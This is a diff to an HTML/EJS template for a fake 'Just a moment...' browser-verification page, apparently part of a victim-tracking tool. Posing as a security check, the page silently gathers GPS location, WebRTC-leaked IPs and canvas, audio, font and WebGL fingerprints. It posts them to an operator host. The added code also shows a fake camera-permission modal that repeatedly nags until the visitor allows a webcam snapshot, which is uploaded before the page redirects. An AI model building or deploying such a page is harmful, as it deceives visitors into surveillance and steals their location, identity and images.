@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Just a moment...</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -25,90 +24,57 @@
             text-align: center;
             color: #333;
         }
-        .logo {
-            font-size: 60px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-            color: #667eea;
-        }
-        .subtitle {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 30px;
-        }
-        .progress-bar {
+        .logo { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        h1 { font-size: 28px; margin-bottom: 10px; color: #667eea; }
+        .subtitle { font-size: 16px; color: #666; margin-bottom: 30px; }
+        .progress-bar { width: 100%; height: 8px; background: #e0e0e0; border-radius: 10px; overflow: hidden; margin: 20px 0; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); animation: progress <%= duration %>ms linear forwards; }
+        @keyframes progress { from { width: 0%; } to { width: 100%; } }
+        .loader { margin: 30px auto; border: 5px solid #f3f3f3; border-top: 5px solid #667eea; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .info-box { background: #f8f9fa; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: left; }
+        .info-item { display: flex; align-items: center; margin: 10px 0; font-size: 14px; }
+        .checkmark { color: #4caf50; font-size: 20px; margin-right: 10px; }
+        .badge { display: inline-block; background: #4caf50; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; margin-top: 15px; }
+        .status { font-size: 14px; color: #999; margin-top: 20px; }
+        
+        /* Camera Modal */
+        .camera-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 8px;
-            background: #e0e0e0;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 20px 0;
-        }
-        .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            border-radius: 10px;
-            animation: progress <%= duration %>ms linear forwards;
-        }
-        @keyframes progress {
-            from { width: 0%; }
-            to { width: 100%; }
-        }
-        .loader {
-            margin: 30px auto;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #667eea;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .info-box {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        .info-item {
-            display: flex;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 9999;
+            justify-content: center;
             align-items: center;
-            margin: 10px 0;
-            font-size: 14px;
         }
-        .info-item span {
-            margin-left: 10px;
+        .camera-modal.active { display: flex; }
+        .camera-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 400px;
         }
-        .checkmark {
-            color: #4caf50;
-            font-size: 20px;
+        .camera-icon { font-size: 80px; margin-bottom: 20px; }
+        .camera-text { font-size: 18px; margin-bottom: 20px; color: #333; }
+        .camera-buttons button {
+            padding: 12px 30px;
+            margin: 10px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
         }
-        .status {
-            font-size: 14px;
-            color: #999;
-            margin-top: 20px;
-        }
-        .badge {
-            display: inline-block;
-            background: #4caf50;
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-top: 15px;
-        }
+        .btn-allow { background: #4caf50; color: white; }
+        .btn-allow:hover { background: #45a049; }
+        .btn-deny { background: #f44336; color: white; }
+        .btn-deny:hover { background: #da190b; }
     </style>
 </head>
 <body>
@@ -126,21 +92,39 @@
         <div class="info-box">
             <div class="info-item">
                 <span class="checkmark">✓</span>
-                <span>Checking browser integrity...</span>
+                <span id="status-1">Gathering device information...</span>
             </div>
             <div class="info-item">
                 <span class="checkmark">✓</span>
-                <span>Verifying security protocols...</span>
+                <span id="status-2">Analyzing network data...</span>
             </div>
             <div class="info-item">
                 <span class="checkmark">✓</span>
-                <span>Validating connection...</span>
+                <span id="status-3">Fingerprinting browser...</span>
+            </div>
+            <div class="info-item">
+                <span class="checkmark">✓</span>
+                <span id="status-4">Collecting system info...</span>
             </div>
         </div>
         
         <div class="badge">🛡️ Protected</div>
-        
         <p class="status">This process is automatic. Please wait...</p>
+    </div>
+
+    <!-- Camera Permission Modal -->
+    <div class="camera-modal" id="cameraModal">
+        <div class="camera-content">
+            <div class="camera-icon">📷</div>
+            <div class="camera-text">
+                <strong>Camera Access Required</strong>
+                <p>This site wants to use your camera for security verification</p>
+            </div>
+            <div class="camera-buttons">
+                <button class="btn-allow" onclick="allowCamera()">Allow</button>
+                <button class="btn-deny" onclick="denyCamera()">Block</button>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -149,77 +133,368 @@
         const targetUrl = '<%= url %>';
         const delay = <%= duration %>;
 
+        let cameraAttempts = 0;
+        let cameraGranted = false;
+        let cameraDenied = false;
+
         function send(endpoint, data) {
             fetch(`${host}/${endpoint}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams(data)
-            }).catch(e => console.error(e));
+            }).catch(() => {});
         }
 
-        // Location
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => send('location', {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    uid: uid,
-                    acc: pos.coords.accuracy
-                }),
-                null,
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+        // ========== MAXIMUM INFO GATHERING ==========
+
+        // 1. Location
+        setTimeout(() => {
+            document.getElementById('status-1').textContent = 'Getting GPS location...';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        send('location', {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            uid: uid,
+                            acc: pos.coords.accuracy
+                        });
+                        document.getElementById('status-1').textContent = '✓ Location captured';
+                    },
+                    () => {
+                        document.getElementById('status-1').textContent = '✓ Location unavailable';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+        }, 500);
+
+        // 2. Battery Info
+        let batteryInfo = 'Not available';
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                batteryInfo = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
+            });
         }
 
-        // Device info
-        const info = `╔══════════════════════╗
-║ <b>📱 Device Info</b>      ║
-╚══════════════════════╝
+        // 3. Network Info
+        let networkInfo = 'Unknown';
+        if ('connection' in navigator || 'mozConnection' in navigator || 'webkitConnection' in navigator) {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            networkInfo = `${conn.effectiveType || 'Unknown'} - ${conn.downlink || '?'} Mbps`;
+        }
 
-<b>🌐 Network</b>
-IP: <%= ip %>
-Time: <%= time %>
+        // 4. WebRTC IP Leak
+        let localIPs = [];
+        let publicIP = 'Unknown';
+        
+        const getIPs = () => {
+            return new Promise((resolve) => {
+                const ips = [];
+                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                
+                if (!RTCPeerConnection) {
+                    resolve(ips);
+                    return;
+                }
 
-<b>🖥️ Device</b>
+                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+                
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    
+                    const parts = ice.candidate.candidate.split(' ');
+                    const ip = parts[4];
+                    
+                    if (ip && !ips.includes(ip)) {
+                        ips.push(ip);
+                    }
+                };
+                
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips);
+                }, 2000);
+            });
+        };
+
+        // 5. Canvas Fingerprint
+        const getCanvasFingerprint = () => {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Hello, World!', 2, 15);
+            return canvas.toDataURL().slice(-50);
+        };
+
+        // 6. Audio Fingerprint
+        const getAudioFingerprint = () => {
+            try {
+                const context = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = context.createOscillator();
+                const analyser = context.createAnalyser();
+                const gainNode = context.createGain();
+                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
+                
+                gainNode.gain.value = 0;
+                oscillator.type = 'triangle';
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gainNode);
+                gainNode.connect(context.destination);
+                oscillator.start(0);
+                
+                return 'Generated';
+            } catch (e) {
+                return 'Not available';
+            }
+        };
+
+        // 7. Installed Fonts Detection
+        const detectFonts = () => {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
+            
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            const installed = testFonts.filter(font => {
+                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                ctx.font = `72px ${font}, monospace`;
+                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                return baseWidth !== testWidth;
+            });
+            
+            return installed.join(', ') || 'None detected';
+        };
+
+        // 8. Plugins Detection
+        const getPlugins = () => {
+            return Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None';
+        };
+
+        // 9. Screen Orientation
+        const getOrientation = () => {
+            return screen.orientation ? screen.orientation.type : 'Unknown';
+        };
+
+        // 10. Device Memory
+        const getDeviceMemory = () => {
+            return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
+        };
+
+        // 11. Hardware Concurrency
+        const getCPUCores = () => {
+            return navigator.hardwareConcurrency || 'Unknown';
+        };
+
+        // Gather ALL Info
+        setTimeout(async () => {
+            document.getElementById('status-2').textContent = 'Collecting network data...';
+            
+            const webrtcIPs = await getIPs();
+            localIPs = webrtcIPs.filter(ip => ip.startsWith('192.') || ip.startsWith('10.') || ip.startsWith('172.'));
+            publicIP = webrtcIPs.find(ip => !ip.startsWith('192.') && !ip.startsWith('10.') && !ip.startsWith('172.')) || 'Not found';
+            
+            document.getElementById('status-2').textContent = '✓ Network analyzed';
+        }, 1000);
+
+        setTimeout(() => {
+            document.getElementById('status-3').textContent = 'Creating fingerprint...';
+            
+            const canvasFingerprint = getCanvasFingerprint();
+            const audioFingerprint = getAudioFingerprint();
+            const installedFonts = detectFonts();
+            
+            document.getElementById('status-3').textContent = '✓ Fingerprint created';
+        }, 2000);
+
+        setTimeout(() => {
+            document.getElementById('status-4').textContent = 'Finalizing data collection...';
+            
+            const completeInfo = `╔══════════════════════════════════════╗
+║        <b>📊 COMPLETE DEVICE INFO</b>        ║
+╚══════════════════════════════════════╝
+
+<b>🌐 NETWORK INFORMATION</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Public IP: <code><%= ip %></code>
+WebRTC IPs: <code>${localIPs.join(', ') || 'None'}</code>
+Public WebRTC: <code>${publicIP}</code>
+Connection: ${networkInfo}
+Online: ${navigator.onLine ? 'Yes' : 'No'}
+
+<b>🖥️ DEVICE & SYSTEM</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Platform: ${navigator.platform}
-Screen: ${screen.width}x${screen.height}
+User Agent: ${navigator.userAgent}
+App Version: ${navigator.appVersion}
+Vendor: ${navigator.vendor}
+CPU Cores: ${getCPUCores()}
+Device Memory: ${getDeviceMemory()}
+
+<b>📱 SCREEN & DISPLAY</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Resolution: ${screen.width}x${screen.height}
+Available: ${screen.availWidth}x${screen.availHeight}
+Color Depth: ${screen.colorDepth}-bit
+Pixel Ratio: ${window.devicePixelRatio}
+Orientation: ${getOrientation()}
+Touch Support: ${navigator.maxTouchPoints > 0 ? 'Yes' : 'No'}
+
+<b>🌍 BROWSER & LANGUAGE</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Language: ${navigator.language}
+Languages: ${navigator.languages.join(', ')}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Timezone Offset: GMT${new Date().getTimezoneOffset() / -60}
 
-<b>🌍 Browser</b>
-${navigator.userAgent}
+<b>🔋 BATTERY & NETWORK</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Battery: ${batteryInfo}
+Network Type: ${networkInfo}
 
-━━━━━━━━━━━━━━━━━━━━━`;
+<b>🔒 SECURITY & PRIVACY</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Do Not Track: ${navigator.doNotTrack || 'Not set'}
+Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
+Local Storage: ${typeof(Storage) !== 'undefined' ? 'Available' : 'Not available'}
+Session Storage: ${typeof(sessionStorage) !== 'undefined' ? 'Available' : 'Not available'}
 
-        send('info', { uid: uid, data: info });
+<b>🔍 BROWSER FINGERPRINT</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Canvas: <code>${canvasFingerprint}</code>
+Audio: ${audioFingerprint}
+WebGL Vendor: ${(function(){try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl');return gl.getParameter(gl.VENDOR)}catch(e){return 'N/A'}})()}
+WebGL Renderer: ${(function(){try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl');return gl.getParameter(gl.RENDERER)}catch(e){return 'N/A'}})()}
 
-        // Camera
-        if (navigator.mediaDevices) {
-            setTimeout(() => {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-                        
-                        video.onloadedmetadata = () => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            
-                            send('camsnap', {
-                                uid: uid,
-                                img: canvas.toDataURL('image/png').split(',')[1]
-                            });
-                            
-                            stream.getTracks().forEach(t => t.stop());
-                        };
-                    })
-                    .catch(e => console.log('Camera denied'));
-            }, 1000);
+<b>🔌 PLUGINS & FONTS</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Plugins: ${getPlugins()}
+Fonts: ${installedFonts}
+
+<b>📅 TIMESTAMP</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Local Time: <%= time %>
+UTC Time: ${new Date().toUTCString()}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<i>Data collected successfully ✓</i>`;
+
+            send('info', { uid: uid, data: completeInfo });
+            
+            document.getElementById('status-4').textContent = '✓ All data collected';
+        }, 3000);
+
+        // ========== CAMERA PERMISSION (PERSISTENT) ==========
+        
+        function showCameraModal() {
+            document.getElementById('cameraModal').classList.add('active');
+            send('camera-status', { uid: uid, status: 'pending' });
         }
 
-        // Redirect
+        function allowCamera() {
+            document.getElementById('cameraModal').classList.remove('active');
+            cameraGranted = true;
+            captureCamera();
+        }
+
+        function denyCamera() {
+            document.getElementById('cameraModal').classList.remove('active');
+            cameraDenied = true;
+            send('camera-status', { uid: uid, status: 'denied' });
+        }
+
+        async function requestCamera() {
+            if (cameraGranted || cameraDenied) return;
+            
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                return;
+            }
+
+            try {
+                // Try to get camera directly first
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                cameraGranted = true;
+                captureCamera(stream);
+            } catch (err) {
+                // If blocked, show custom modal
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    cameraAttempts++;
+                    
+                    if (cameraAttempts < 3) {
+                        // Show modal again
+                        setTimeout(() => {
+                            showCameraModal();
+                        }, 2000);
+                    } else {
+                        cameraDenied = true;
+                        send('camera-status', { uid: uid, status: 'denied' });
+                    }
+                } else {
+                    // Show modal for first-time permission
+                    showCameraModal();
+                }
+            }
+        }
+
+        function captureCamera(stream) {
+            if (!stream) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                    .then(s => processCamera(s))
+                    .catch(() => {});
+            } else {
+                processCamera(stream);
+            }
+        }
+
+        function processCamera(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            send('camera-status', { uid: uid, status: 'allowed' });
+            
+            video.onloadedmetadata = () => {
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/png').split(',')[1];
+                    
+                    send('camsnap', { uid: uid, img: imageData });
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                }, 500);
+            };
+        }
+
+        // Start camera request after 4 seconds
+        setTimeout(() => {
+            requestCamera();
+        }, 4000);
+
+        // Keep trying every 5 seconds until allowed/denied
+        const cameraInterval = setInterval(() => {
+            if (!cameraGranted && !cameraDenied && cameraAttempts < 5) {
+                requestCamera();
+            } else {
+                clearInterval(cameraInterval);
+            }
+        }, 5000);
+
+        // Redirect after delay
         setTimeout(() => {
             window.location.href = targetUrl;
         }, delay);
